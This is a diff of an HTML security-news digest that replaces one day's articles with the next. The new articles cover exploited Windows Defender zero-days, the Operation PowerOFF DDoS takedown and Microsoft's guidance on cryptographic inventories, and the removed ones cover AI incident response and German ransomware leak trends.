@@ -59,144 +59,282 @@
         </style>
     </head>
     <body>
-        <h1>Security Briefing // 2026-04-16</h1>
+        <h1>Security Briefing // 2026-04-17</h1>
         <div class="menu">
-            <ul><li><button onclick="show('art-0')">Critical Nginx UI auth bypass flaw now actively exploited in the wild</button></li><li><button onclick="show('art-1')">Incident response for AI: Same fire, different fuel</button></li><li><button onclick="show('art-2')">The German Cyber Criminal Überfall: Shifts in Europe's Data Leak Landscape</button></li><li><button onclick="show('art-3')">Actively Exploited nginx-ui Flaw (CVE-2026-33032) Enables Full Nginx Server Takeover</button></li><li><button onclick="show('art-4')">Patch Tuesday, April 2026 Edition</button></li><li><button onclick="show('art-5')">CISA Adds Two Known Exploited Vulnerabilities to Catalog</button></li><li><button onclick="show('art-6')">CISA Adds 6 Known Exploited Flaws in Fortinet, Microsoft, and Adobe Software</button></li><li><button onclick="show('art-7')">Building a Detection Foundation: Part 5 - Correlation in Practice</button></li><li><button onclick="show('art-8')">Microsoft Patch Tuesday, March 2026 Edition</button></li><li><button onclick="show('art-9')">Updates to the MSSQLHound OpenGraph Collector for BloodHound</button></li></ul>
+            <ul><li><button onclick="show('art-0')">Recently leaked Windows zero-days now exploited in attacks</button></li><li><button onclick="show('art-1')">Operation PowerOFF Seizes 53 DDoS Domains, Exposes 3 Million Criminal Accounts</button></li><li><button onclick="show('art-2')">Building your cryptographic inventory: A customer strategy for cryptographic posture management</button></li><li><button onclick="show('art-3')">Into The Rainbow: Google’s NTLMv1 Rainbow Tables Explained in a Bit Too Much Detail</button></li><li><button onclick="show('art-4')">Defending Your Enterprise When AI Models Can Find Vulnerabilities Faster Than Ever</button></li><li><button onclick="show('art-5')">Dungeons and Daemons</button></li><li><button onclick="show('art-6')">Patch Tuesday, April 2026 Edition</button></li><li><button onclick="show('art-7')">CISA Adds Two Known Exploited Vulnerabilities to Catalog</button></li><li><button onclick="show('art-8')">CISA Adds 6 Known Exploited Flaws in Fortinet, Microsoft, and Adobe Software</button></li><li><button onclick="show('art-9')">Microsoft Patch Tuesday, March 2026 Edition</button></li></ul>
         </div>
         
         <div id="art-0" class="article-body">
-            <h2 class="article-title">Critical Nginx UI auth bypass flaw now actively exploited in the wild</h2>
-            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/critical-nginx-ui-auth-bypass-flaw-now-actively-exploited-in-the-wild/" target="_blank">Original Link</a></p>
-            <div class="content-text">A critical vulnerability in Nginx UI with Model Context Protocol (MCP) support is now being exploited in the wild for full server takeover without authentication. [...]
+            <h2 class="article-title">Recently leaked Windows zero-days now exploited in attacks</h2>
+            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/recently-leaked-windows-zero-days-now-exploited-in-attacks/" target="_blank">Original Link</a></p>
+            <div class="content-text">Threat actors are exploiting three recently disclosed Windows security vulnerabilities in attacks aimed at gaining SYSTEM or elevated administrator permissions.
+Since the start of the month, a security researcher known as "Chaotic Eclipse" or "Nightmare-Eclipse" has published proof-of-concept exploit code for all three security issues in protest to how Microsoft's Security Response Center (MSRC) handled the disclosure process.
+Two of the vulnerabilities (dubbed [BlueHammer](https://www.bleepingcomputer.com/news/security/disgruntled-researcher-leaks-bluehammer-windows-zero-day-exploit/) and [RedSun](https://www.bleepingcomputer.com/news/microsoft/new-microsoft-defender-redsun-zero-day-poc-grants-system-privileges/)) are Microsoft Defender local privilege escalation (LPE) flaws, while the third (known as [UnDefend](https://github.com/Nightmare-Eclipse/UnDefend)) can be exploited as a standard user to block Microsoft Defender definition updates.
+At the time of the leak, the security flaws these exploits targeted were considered zero-days by [Microsoft's definition](https://learn.microsoft.com/en-us/defender-vulnerability-management/tvm-zero-day-vulnerabilities?tabs=preview-customers%2Cpreview-customers-vulnerabilities), since they had no official patches or updates to address them.
+On Thursday, Huntress Labs security researchers [reported](https://x.com/HuntressLabs/status/2044882050314817880) seeing all three zero-day exploits deployed in the wild, with the BlueHammer vulnerability being exploited since April 10.
+They also [spotted UnDefend and RedSun exploits](https://x.com/HuntressLabs/status/2044882115574091960) on a Windows device that was breached using a compromised SSLVPN user, in attacks showing evidence of "hands-on-keyboard threat actor activity."
+"The Huntress SOC is observing the use of Nightmare-Eclipse's BlueHammer, RedSun, and UnDefend exploitation techniques," the researchers said.
+Two zero-days still waiting for a patch
+While Microsoft is now tracking the BlueHammer vulnerability as CVE-2026-33825 and has patched it in the April 2026 security updates, the other two flaws remain unaddressed.
+As [BleepingComputer previously reported](https://www.bleepingcomputer.com/news/microsoft/new-microsoft-defender-redsun-zero-day-poc-grants-system-privileges/), attackers can use the RedSun exploit to gain SYSTEM privileges on Windows 10, Windows 11, and Windows Server 2019 and later systems when Windows Defender is enabled, even after applying the April Patch Tuesday patches.
+"When Windows Defender realizes that a malicious file has a cloud tag, for whatever stupid and hilarious reason, the antivirus that's supposed to protect decides that it is a good idea to just rewrite the file it found again to it's original location," [the researcher explained](https://github.com/Nightmare-Eclipse/RedSun). "The PoC abuses this behaviour to overwrite system files and gain administrative privileges."
+"Microsoft has a customer commitment to investigate reported security issues and update impacted devices to protect customers as soon as possible," a Microsoft spokesperson told BleepingComputer earlier this week when contacted for more information on the disclosure issues reported by the anonymous researcher.
+"We also support coordinated vulnerability disclosure, a widely adopted industry practice that helps ensure issues are carefully investigated and addressed before public disclosure, supporting both customer protection and the security research community."
+[99% of What Mythos Found Is Still Unpatched.](https://hubs.li/Q04crVgD0)
+AI chained four zero-days into one exploit that bypassed both renderer and OS sandboxes. A wave of new exploits is coming.
+At the Autonomous Validation Summit (May 12 & 14), see how autonomous, context-rich validation finds what's exploitable, proves controls hold, and closes the remediation loop.
+Post a Comment Community Rules
+You need to login in order to post a comment
+Not a member yet? Register Now</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-1" class="article-body">
+            <h2 class="article-title">Operation PowerOFF Seizes 53 DDoS Domains, Exposes 3 Million Criminal Accounts</h2>
+            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/04/operation-poweroff-seizes-53-ddos.html" target="_blank">Original Link</a></p>
+            <div class="content-text">An international law enforcement operation has taken down 53 domains and arrested four people in connection with commercial distributed denial-of-service (DDoS) operations that were used by more than 75,000 cybercriminals.
+The ongoing effort, dubbed Operation PowerOFF, disrupted access to the DDoS-for-hire services, took down the technical infrastructure supporting them, and obtained access to
 
 [Full content could not be extracted. Visit source for details.]</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-1" class="article-body">
-            <h2 class="article-title">Incident response for AI: Same fire, different fuel</h2>
-            <p class="source-link">Source: Microsoft Security Blog | <a href="https://www.microsoft.com/en-us/security/blog/2026/04/15/incident-response-for-ai-same-fire-different-fuel/" target="_blank">Original Link</a></p>
-            <div class="content-text">When a traditional security incident hits, responders replay what happened. They trace a known code path, find the defect, and patch it. The same input produces the same bad output, and a fix proves it will not happen again. That mental model has carried incident response for decades.
-AI breaks it. A model may produce harmful output today, but the same prompt tomorrow may produce something different. The root cause is not a line of code; it is a probability distribution shaped by training data, context windows, and user inputs that no one predicted. Meanwhile, the system is generating content at machine speed. A gap in a safety classifier does not leak one record. It produces thousands of harmful outputs before a human reviewer sees the first one.
-Fortunately, most of the fundamentals that make incident response (IR) effective still hold true. The instincts that seasoned responders have developed over time still apply: prioritizing containment, communicating transparently, and learning from each.
-AI introduces new categories of harm, accelerates response timelines, and calls for skills and telemetry that many teams are still developing. This post explores which [practices remain effective](https://learn.microsoft.com/security/zero-trust/sfi/incident-response-ai-systems) and which require fresh preparation.
-The fundamentals still hold
-The core insight of crisis management applies to AI without modification: the technical failure is the mechanism, but trust is the actual system under threat. When an AI system produces harmful output, leaks training data, or behaves in ways users did not expect, the damage extends beyond the technical artifact. Trust has technical, legal, ethical, and social dimensions. Your response must address all of them, which is why incident response for AI is inherently cross-functional.
-Several established principles transfer directly.
-Explicit ownership at every level. Someone must be in command. The incident commander synthesizes input from domain experts; they do not need to be the deepest technical expert in the room. What matters is that ownership is clear and decision-making authority is understood.
-Containment before investigation. Stop ongoing harm first. Investigation runs in parallel, not after containment is complete. For AI systems, this might mean disabling a feature, applying a content filter, or throttling access while you determine scope.
-Escalation should be psychologically safe. The cost of escalating unnecessarily is minor. The cost of delayed escalation can be severe. Build a culture where raising a flag early is expected, not penalized.
-Communication tone matters as much as content. Stakeholders tolerate problems. They cannot tolerate uncertainty about whether anyone is in control. Demonstrate active problem-solving. Be explicit about what you know, what you suspect, and what you are doing about each.
-These principles are tested, and they are effective in guiding action. The challenge with AI is not that these principles no longer apply; it is that AI introduces conditions where applying them requires new information, new tools, and new judgment.
-Where AI changes the equation
-Non-determinism and speed are the headline shifts, but they are not the only ones.
-New harm types complicate classification and triage. Traditional IR taxonomies center on confidentiality, integrity, and availability. AI incidents can involve harms that do not fit those categories cleanly: generating dangerous instructions, producing content that targets specific groups, or enabling misuse through natural language interfaces. By making advanced capabilities easy to use, these interfaces enable untrained users to perform complex actions, increasing the risk of misuse or unintended harm. This is why we need an expanded taxonomy. If your incident classification system lacks categories for these harms, your triage process will default to “other” and lose signal.
-Severity resists simple quantification. A model producing inaccurate medical information is a different severity than the same model producing inaccurate trivia answers. Good severity frameworks guide judgment; they cannot replace it. For AI incidents, the context around who is affected and how they are affected carries more weight than traditional security metrics alone can capture.
-Root cause is often multi-dimensional. In traditional incidents, you find the bug and fix it. In AI incidents, problematic behavior can emerge from the interaction of training data, fine-tuning choices, user context, and retrieval inputs. Investigation may narrow the contributing factors without isolating one defect. Your process must accommodate that ambiguity rather than stalling until certainty arrives.
-Before the crisis is the time to work through these implications. The questions that matter: How and when will you know? Who is on point and what is expected of them? What is the response plan? Who needs to be informed, and when? Every one of these questions that you answer before the incident is time you buy during it.
-Closing the gaps in telemetry, tooling, and response
-If AI changes the nature of incidents, it also changes what you need to detect and respond to them.
-Observability is the first gap. Traditional security telemetry monitors network traffic, authentication events, file system changes, and process execution. AI incidents generate different signals: anomalous output patterns, spikes in user reports, shifts in content classifier confidence scores, unexpected model behavior after an update. Many organizations have not yet instrumented AI systems for these signals and, without clear signal, defenders may first learn about incidents from social media or customer complaints. Neither provides the early warning that effective response requires.
-AI systems are built with strong privacy defaults – minimal logging, restricted retention, anonymized inputs – and those same defaults narrow the forensic record when you need to establish what a user saw, what data the model touched, or how an attacker manipulated the system. Privacy-by-design and investigative capability require deliberate reconciliation before an incident, because that decision does not get easier once the clock is running.
-AI can also help close these gaps. We use AI in our own response operations to enhance our ability to:
-- Detect anomalous outputs as they occur
-- Enforce content policies at system speed
-- Examine model outputs at volumes no human team can match
-- Distill incident discussions so responders spend time deciding rather than reading
-- Coordinate across response workstreams faster than email chains allow
-Staged remediation reflects the reality of AI fixes. Incidents require both swift action and thorough review. A model behavior change or guardrail update may not be immediately verifiable in the way a traditional patch is. We use a three-stage approach:
-- Stop the bleed. Tactical mitigations: block known-bad inputs, apply filters, restrict access. The goal is reducing active harm within the first hour.
-- Fan out and strengthen. Broader pattern analysis and expanded mitigations over the next 24 hours, covering thousands of related items. Automation is essential here; manual review cannot keep pace.
-- Fix at the source. Classifier updates, model adjustments, and systemic changes based on what investigation revealed. This stage takes longer, and that is acceptable. The first two stages bought time.
-One practical tip: tactical allow-and-block lists are a necessary triage tool, but they are a losing proposition as a permanent solution. Adversaries adapt. Classifiers and systemic fixes are the durable answer.
-Watch periods after remediation matter more for AI than for traditional patches. Because model behavior is non-deterministic, verification relies on sustained testing and monitoring across varied conditions rather than a single test pass. Sustained monitoring after each stage confirms that the remediation holds under varied conditions.
-The human dimension
-There is a dimension of AI incident response that traditional IR addresses unevenly and that AI makes urgent: the wellbeing of the people doing the work.
-Defenders handling AI abuse reports and safety incidents are routinely exposed to harmful content. This is not the same cognitive load as analyzing malware samples or reviewing firewall logs. Exposure to graphic, violent, or exploitative material has measurable psychological effects, and extended incidents compound that exposure over days or weeks.
-Human exhaustion threatens correctness, continuity, and judgment in any prolonged incident. AI safety incidents place an additional emotional burden on responders due to exposure to distressing content. Recognizing and addressing this challenge is essential, as it directly impacts the well-being of the team and the quality of the response.
-What helps:
-- Talk to your team about well-being before the crisis, not during it.
-- Manager-sponsored interventions during extended response work, including scheduled breaks, structured handoffs, and deliberate activities that provide cognitive relief.
-- Some teams use structured cognitive breaks, including visual-spatial activities, to reduce the impact of prolonged exposure to harmful content.
-- Coaching and peer mentoring programs normalize the impact rather than framing it as individual weakness.
-- Leveraging proven practices from safety content moderation teams, whose operational workflows for content review and escalation map directly to AI security moderation is a natural collaboration opportunity.
-If your incident response plan does not account for the humans executing it, the plan is incomplete.
-Looking ahead
-Incident response for AI is not a solved problem. The threat surface is evolving as models gain new capabilities, as agentic architectures introduce autonomous action, and as adversaries learn to exploit natural language at scale. The teams that will handle this well are the ones [building adaptive capacity now](https://learn.microsoft.com/security/zero-trust/sfi/incident-response-ai-systems). Extend playbooks. Instrument AI systems for the right signals. Rehearse novel scenarios. Invest in the people who will be on the front line when something breaks. Good response processes limit damage. Great ones make you stronger for the next incident.
+        <div id="art-2" class="article-body">
+            <h2 class="article-title">Building your cryptographic inventory: A customer strategy for cryptographic posture management</h2>
+            <p class="source-link">Source: Microsoft Security Blog | <a href="https://www.microsoft.com/en-us/security/blog/2026/04/16/building-your-cryptographic-inventory-a-customer-strategy-for-cryptographic-posture-management/" target="_blank">Original Link</a></p>
+            <div class="content-text">Post-quantum cryptography (PQC) is coming—and for most organizations, the hardest part won’t be choosing new algorithms. It will be finding where cryptography is used today across applications, infrastructure, devices, and services so teams can plan, prioritize, and modernize with confidence. At Microsoft, we view this as the practical foundation of quantum readiness: you can’t protect or migrate what you can’t see.
+As described in our [Quantum Safe Program strategy](https://aka.ms/QSP/Strategy-2025), cryptography is embedded in all modern IT environments across every industry: in applications, network protocols, cloud services, and hardware devices. It also evolves constantly to ensure the best protection from newly discovered vulnerabilities, evolving standards from bodies like NIST and IETF, and emerging regulatory requirements. However, many organizations face a widespread challenge: without a comprehensive inventory and effective lifecycle process, they lack the visibility and agility needed to keep their infrastructure secure and up to date. As a result, when new vulnerabilities or mandates emerge, teams often struggle to quickly identify affected assets, determine ownership, and prioritize remediation efforts. This underscores the importance of establishing clear, ongoing inventory practices as a foundation for resilient management across the enterprise.
+The first and most critical step toward a quantum-safe future—and sound cryptographic hygiene in general—is building a comprehensive cryptographic inventory. PQC adoption (like any cryptographic transition) is ultimately an engineering and operations exercise: you are updating cryptography across real systems with real dependencies, and you need visibility to do it safely.
+In this post, we will define what a cryptographic inventory is, outline a practical customer-led operating model for managing cryptographic posture, and show how customers can start quickly using [Microsoft Security](https://www.microsoft.com/en-us/security?ef_id=_k_e6b429a1a6ab135154ff407995601207_k_&OCID=AIDcmmy26p4kaz_SEM__k_e6b429a1a6ab135154ff407995601207_k_&msclkid=e6b429a1a6ab135154ff407995601207) capabilities and our partners.
+What is a cryptographic inventory?
+A cryptographic inventory is a living catalog of all the cryptographic assets and mechanisms in use across your organization. This includes the following examples:
+| Category | Examples/Details |
+|---|---|
+Certificates and keys | X.509 certificates, private/public key pairs, certificate authorities, key management systems |
+Protocols and cipher suites | TLS/SSL versions and configurations, SSH protocols, IPsec implementations |
+Cryptographic libraries | OpenSSL, LibCrypt, SymCrypt, other libraries embedded in applications |
+Algorithms in code | Cryptographic primitives referenced in source code (RSA, ECC, AES, hashing functions) |
+Encrypted session metadata | Active network sessions using encryption, protocol handshake details |
+Secrets and credentials | API keys, connection strings, service principal credentials stored in code, configuration files, or vaults |
+Hardware security modules (HSMs) | Physical and virtual HSMs, Trusted Platform Modules (TPMs) |
+Why does this inventory matter? First, governance and compliance: 15 countries and the EU recommend or require some subset of organizations to do cryptographic inventorying. These are implemented through regulations like DORA, government policies like OMB M-23-02, and industry security standards like PCI DSS 4.0. We expect the [number and scope of these polices to grow](https://blogs.microsoft.com/on-the-issues/2025/08/20/post-quantum-resilience-building-secure-foundations/) globally.
+Second, risk prioritization: Cryptographic assets present varying levels of risk. For example, an internet-facing TLS endpoint using weak ciphers poses different threats compared to an internal test certificate, or local disk encryption utilizing the AES standard. Maintaining a comprehensive inventory enables effective assessment of exposure and facilitates the prioritization of remediation efforts, ensuring that risk-based decisions incorporate live telemetry and data sensitivity.
+Third, it helps enable crypto agility: When a vulnerability is discovered in an encryption algorithm, an inventory can tell you exactly what needs updating and where.
+Customer-led cryptography posture management lifecycle
+Cryptography Posture Management (CPM) is not a single product, it’s an ongoing lifecycle that customers build and maintain using a combination of tools, integrations, and processes. Many organizations are building Quantum Safe Programs as a broader umbrella for cryptographic readiness. Whether or not you use that exact label, the technical foundation tends to look the same:
+- Define what you are managing (the inventory scope and critical assets).
+- Define how you make decisions (risk assessment and prioritization).
+- Define how you execute change safely (remediation and validation).
+- Define how you keep it current (continuous monitoring).
+This is where CPM is best understood as a lifecycle you run continuously:
+- Discover: Collect cryptographic signals from across your environment – code repositories, runtime environments, network traffic, and storage systems.
+- Normalize: Aggregate signals into a unified inventory with consistent data schema (certificate thumbprints, algorithm types, key lengths, and expiration dates).
+- Assess Risk: Evaluate cryptographic assets against policy baselines, industry standards, and known vulnerabilities. Identify weak algorithms, expired certificates, and non-compliant configurations.
+- Prioritize: Rank findings by risk based on asset criticality, exposure (internal vs. internet-facing), and compliance requirements.
+- Remediate: Rotate keys, update libraries, reconfigure protocols, and replace weak algorithms—using available automation and tooling.
+- Continuous Monitoring: Continuously track changes. New code commits, certificate renewals, configuration drift, and emerging vulnerabilities all require ongoing vigilance.
+You can apply the lifecycle above across four domains: code, network, runtime, and storage:
+- Code: Cryptographic primitives and libraries in source code, detected through source code analysis.
+- Storage: Certificates, keys, and secrets stored on disk, in databases, in key vaults, or configuration files.
+- Network: Encrypted traffic sessions, TLS/SSH handshakes, cipher suite negotiations.
+- Runtime: In-memory usage of cryptographic libraries, active key material, process-level crypto operations.
+Since the operating model is broad across multiple signals with no single team or platform, ensure you define clear ownership for each stage, with consistent inputs and measurable outputs. That’s why a “one-and-done” scan rarely holds up. The environment changes constantly new deployments, new libraries, renewed certificates, new endpoints, and new policies. The path that scales is an operating model, not a one-time project. By organizing your approach around these domains, you can systematically identify gaps, leverage the right tools for each domain, and build a holistic view of your cryptographic posture.
+Building your inventory with Microsoft tools
+You don’t have to start from scratch. Many organizations already have Microsoft Security and Azure capabilities deployed that can generate cryptographic signals across code, endpoints, cloud workloads, and networks. The goal is to connect and normalize those signals into an inventory that supports risk-based decisions—then extend coverage with partner solutions where you need deeper visibility, automation, or multi-vendor reach:
+| Microsoft Tool | Cryptographic Signals | Domain Coverage | Public Documentation |
+|---|---|---|---|
+GitHub Advanced Security (GHAS) | Identifies cryptographic algorithm artifacts in code via CodeQL | Code | |
+Microsoft Defender for Vulnerability Management (MDVM) | Certificate inventory from devices with MDE agents, including asymmetric keys algorithm details; detects cryptographic libraries and their vulnerabilities | Runtime, Storage | |
+Microsoft Defender for Endpoint (MDE) | Identifies encrypted traffic sessions (TLS, SSH) via network detection and response | Runtime, Network | |
+Microsoft Defender for Cloud (MDC) | Secret scanning for private keys exposed on cloud infrastructure; DevOps security for code repositories | Storage, Code | |
+Azure Key Vault | Centralized inventory of keys, secrets, and certificates stored in Azure | Storage | |
+Azure Networking (Firewall, Network Watcher) | High-level indication of encrypted traffic, protocol information (TLS, encrypted communication types) | Network |
+Using these tools in the initial phases:
+- Code Domain: Activate GitHub Advanced Security for your repositories. Use CodeQL queries to scan for cryptographic algorithm usage, and export results for central oversight.
+- Runtime and Storage Domain: Deploy Microsoft Defender for Endpoint and Defender Vulnerability Management across your endpoints. Use the certificate inventory feature to discover certificates and their associated algorithms. Review vulnerable cryptographic libraries flagged by MDVM.
+- Network Domain: Enable network protection in MDE to identify encrypted sessions. If you’re using Azure, configure Azure Network Watcher to capture traffic metadata and identify encrypted flows.
+- Storage Domain: Audit your Azure Key Vault instances to inventory secrets, keys, and certificates. Use Defender for Cloud secret scanning to detect exposed keys in IaaS and PaaS resources.
+- Normalize & Centralize: Bring outputs together in a common view and schema for tracking (for example, in a security data platform or SIEM such as Microsoft Sentinel). Many teams start with supported exports/connectors and existing reporting workflows—then mature toward automation and governed data pipelines as the program scales. The goal is a single, queryable inventory that teams can operate.
+- Assess & Prioritize: Define your cryptographic policy baselines (e.g., minimum key lengths, approved algorithms, certificate expiration thresholds). Compare your inventory against these baselines and prioritize based on risk.
+This approach leverages tools many organizations already have deployed, providing a pragmatic starting point without requiring significant new investment.
+Accelerating your journey with the partner ecosystem
+As organizations progress from initial cryptographic inventory to ongoing posture management, Microsoft partners with leading CPM providers to deliver comprehensive solutions that address complex environments across code, infrastructure, devices, applications, and both cloud and on-premises systems. These integrated CPM solutions—running on Azure and deeply connected with the Microsoft Security platform—enable holistic inventory, visibility, and risk assessment by collecting cryptographic signals from Microsoft and non-Microsoft sources, supporting industries with stringent regulatory demands and complex legacy estates, and providing unified management, guided remediation, and quantum security readiness at scale.
+Microsoft partners such as Keyfactor, Forescout, Entrust, and Isara, have CPM solutions available today. Each partner delivers unique capabilities spanning certificate and key lifecycle management, network visibility, software supply chain, and code analysis. Together, this growing ecosystem gives customers the flexibility to adopt CPM solutions integrated with the Microsoft Security platform that support a broad range of customer scenarios and align to your architecture, risk profile, and operational maturity.
+- Keyfactor:
+[Keyfactor AgileSec](https://securitystore.microsoft.com/solutions/infosecglobal1632846037582.agilesec-analytics-connector)discovers, then continuously monitors, all instances of your cryptography, known and unknown, to understand where and how they are used across the organization. Assets are then processed to flag vulnerabilities to enable teams to efficiently remediate risks with advanced integration workflows, providing the base for crypto-agility and quantum readiness. - Forescout:
+[Forescout Cyber Assurance](https://securitystore.microsoft.com/solutions/forescout.netseccyberassurance)solution on Azure allows a customer to determine real-time network risk of an enterprise asset including its usage of PQC and non-PQC communications, matrixed by 1,000’s of other attributes including application, protocol, country, geo, risk and posture across IT, IoT and OT environments. - Entrust:
+[Entrust Cryptographic Security Platform](https://marketplace.microsoft.com/en-us/product/entrustdatacard.entrust_cryptographic_security_platform?OCID=AIDcmmcck6s5zt_SEM__k_3f1df5ded8ad1eca9c0a9c1b9fa953d6_k_&tab=Overview)delivers visibility, automation, and control across PKI, key and certificate lifecycle management, and HSMs within a scalable architecture built for crypto-agility and post-quantum readiness. - Isara: ISARA Advance™ is a crypto posture management solution for enterprises and agencies.
+[Advance is deployed on Microsoft Azure](https://isara.com/partner-msazure.html)to automate discovery and inventory, quantify the risks, prioritize, and remediate. Within hours of deployment, it discovers cryptographic threats due to outdated protocols, weaknesses in key strengths and algorithms, prioritizes, and allows remediation of the cryptography and configuration changes on the servers, apps, databases, and source code components.
+Getting started: a customer checklist
+Ready to begin building your cryptographic inventory? Here’s a practical checklist to get started:
+- Establish ownership: Assign clear accountability for cryptographic governance. This often spans security, infrastructure, and development teams. It ensures someone owns the overall inventory and posture.
+- Start inventory collection: Use the starter playbook above or a Microsoft Partner to begin collecting signals from code, runtime, network, and storage domains using Microsoft tools you already have.
+- Define crypto policy baselines: Document your organization’s cryptographic standards (approved algorithms, minimum key lengths, certificate validity periods, protocol versions). Align with industry standards and compliance requirements.
+- Prioritize exposures: Not all findings are equal. Prioritize based on asset criticality, exposure (internet-facing vs. internal), and compliance mandates.
+- Plan remediation: Identify remediation approaches for high-priority findings—library updates, certificate rotations, protocol reconfigurations. Build runbooks and automation where possible.
+- Leverage partners to accelerate: If you need broader coverage, faster deployment, or specialized capabilities, explore the partner ecosystem on Azure Marketplace to find solutions that integrate with your Microsoft security investments and accelerate your efforts.
+Cryptographic posture management is a journey, not a destination. As standards evolve, new vulnerabilities emerge, and quantum computing advances, your inventory and operating model will need to adapt. But, by starting now, with the tools you have, the partners who can help, and a clear operating model, you’ll be well-positioned not only for the quantum era but for sound cryptographic hygiene in the years ahead.
 To learn more about Microsoft Security solutions, visit our [website](https://www.microsoft.com/en-us/security/business). Bookmark the [Security blog](https://www.microsoft.com/security/blog/) to keep up with our expert coverage on security matters. Also, follow us on LinkedIn ([Microsoft Security](https://www.linkedin.com/showcase/microsoft-security/)) and X ([@MSFTSecurity](https://twitter.com/@MSFTSecurity)) for the latest news and updates on cybersecurity.</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-2" class="article-body">
-            <h2 class="article-title">The German Cyber Criminal Überfall: Shifts in Europe's Data Leak Landscape</h2>
-            <p class="source-link">Source: Threat Intelligence | <a href="https://cloud.google.com/blog/topics/threat-intelligence/europe-data-leak-landscape/" target="_blank">Original Link</a></p>
-            <div class="content-text">The German Cyber Criminal Überfall: Shifts in Europe's Data Leak Landscape
-Google Threat Intelligence Group
-Google Threat Intelligence
-Visibility and context on the threats that matter most.
-[Contact Us & Get a Demo](https://cloud.google.com/security/resources/google-threat-intelligence-demo?utm_source=cgc-blog&utm_medium=blog&utm_campaign=FY25-Q2-global-GCP30649-website-su-dgcsm-GTI-interest)
-Written by: Jamie Collier, Robin Grunewald
-Germany has reclaimed its position as a primary focus for cyber extortion in Europe. While data leak site (DLS) posts rose almost 50% globally in 2025, Google Threat Intelligence (GTI) data shows that the surge is hitting German infrastructure harder and faster than its regional neighbors, marking a significant return to the high-pressure levels previously observed in the country during 2022 and 2023.
-Cyber Criminals Pivoting Back to Germany
-Germany moved to the forefront of European data leak targets in 2025. Following a 2024 period where the UK led in DLS victims, this pivot reflects a resurgence of the intense pressure observed across German infrastructure during 2022 and 2023.
-This targeting is not a result of the overall number of companies within Europe, as Germany has [fewer active enterprises](https://www.hithorizons.com/eu/analyses/country-statistics) than France or Italy. Instead, its sustained appeal to extortion groups is driven by its status as an advanced European economy with an increasingly digitized industrial base.
-Figure 1: Percentage of data leaks affecting European nations in 2025
-The speed of this escalation is particularly notable. Following a relative cooling of activity in 2024, Germany saw a 92% growth in leaks in 2025—a growth rate that tripled the European average.
-Figure 2: The number of German victims listed in data leak sites grew 92% in 2025 compared to 2024
-While several factors influenced European ransomware trends in 2025, a striking contrast emerged in leak volumes. While shaming-site postings for UK-based organizations cooled, non-English speaking nations (particularly Germany) witnessed a surge. This shift reflects a convergence of several factors. The continued maturation of the cyber criminal ecosystem, including the use of AI to automate high-quality localization, is further eroding the historical protection offered by language barriers. However, this "linguistic pivot" is also supported by a shift in victim profiles. As larger "big game" targets in North America and the UK improve their security posture or utilize cyber insurance to resolve incidents privately, threat actors appear to be pivoting toward the "ripe markets" of the German Mittelstand (discussed in further detail later in this post).
-Google Threat Intelligence Group (GTIG) has also observed multiple cyber criminal groups post advertisements, seeking access to German companies and offering a proportion of any extortion fees obtained from victims. For example, dating back to November 2024, the threat actor known as Sarcoma has targeted businesses across several highly developed nations, including Germany.
-Figure 3: A forum post by an actor seeking a partnership to target German victims
-While the 2025 data marks a record year for German leak volume, it is important to [contextualize these figures with a degree of caution](https://cloud.google.com/blog/topics/threat-intelligence/ransomware-ttps-shifting-threat-landscape). Relying solely on DLS numbers can be misleading, as threat actors typically only post victims who refuse to initiate or complete extortion negotiations. Public reporting on the [decline in ransom payment rates](https://www.coveware.com/blog/2026/2/3/mass-data-exfiltration-campaigns-lose-their-edge-in-q4-2025#payments) may be partially fueling the steady increase in shaming site posts as a secondary pressure tactic. Consequently, while the surge in Germany remains a critical trend, these metrics should be viewed as one component of a broader, more complex threat landscape.
-The Diversifizierung of the Cyber Criminal Ecosystem
-2025 was characterized by significant turbulence in the cyber criminal ecosystem, driven by internal conflicts and aggressive law enforcement actions against dominant "big game" operations like LOCKBIT and ALPHV. The resulting vacuum at the top of the ransomware market has led to a more crowded field of agile, mid-tier DLS brands. In Germany, this rebalancing is highly visible: as established brands receded, a wider pool of competitors emerged to absorb the market share.
-Figure 4: German victims on data leak sites rose sharply in 2025
-Following the disruption of LockBit, groups such as SAFEPAY and Qilin have gained significant prominence within the German landscape. SAFEPAY, in particular, claimed breaches of 76 German companies in 2025—accounting for 25% of all German victim posts that year. Meanwhile, Qilin tripled its operational tempo in Germany during Q3 2025. While this increase aligns with Qilin's broader global uptick in activity, their consistent focus on German targets (including 13 victims posted already in early 2026) demonstrates that their presence in the German landscape grows in lockstep with their global expansion.
-Figure 5: Leaked data of a German company (name redacted) by SafePay
-No Such Thing as Too Small: Targeting of the Mittelstand
-There is a persistent myth that small businesses are "too small" to be targeted, a perception often fueled by the fact that large global corporations often dominate cyber crime headlines. However, the 2025 data tells a different story: organizations with fewer than 5,000 employees accounted for 96% of all ransomware leaks in Germany. While this figure largely aligns with the structural composition of the German economy, it underscores a concerning disconnect between public perception and actual targeting patterns. While "big game" hits make the news, the high volume of leaks among medium- and small-sized victims proves they are highly attractive targets for cyber criminals—often because they lack the extensive security personnel and specialized resources of their larger counterparts.
-The targeting of the Mittelstand creates a significant secondary risk for large German enterprises and multinationals. While a major corporation may have robust defenses, its broader ecosystem of suppliers and contractors often manages sensitive data or maintains privileged network access. To address these systemic gaps, large enterprises must evolve from passive monitoring to a proactive third-party risk management framework, implementing vendor tiering and enforcing multifactor authentication to neutralize the lateral movement favored by modern cyber criminals.
-Figure 6: Size of victim organizations found on data leak sites
-Targeting Beyond the Assembly Line
-Germany's industrial base remains the primary focus for cyber criminals with manufacturing accounting for 23% of all dark web leaks in 2025. However, the German cyber criminal landscape is characterized by its variety, with legal & professional services (14%), construction & engineering (11%), and retail (10%) all targeted.
-The most notable shift in the 2025 data is the growth within the legal & professional services sector. This increase is likely intentional: these firms represent high-value targets because they serve as trusted custodians of sensitive client data, including intellectual property, financial strategies, and M&A plans. This allows cyber criminals to extract significant extortion payments beyond their primary victim and gain downstream leverage over an entire client base.
-Figure 7: Data leak victims in Germany by industry
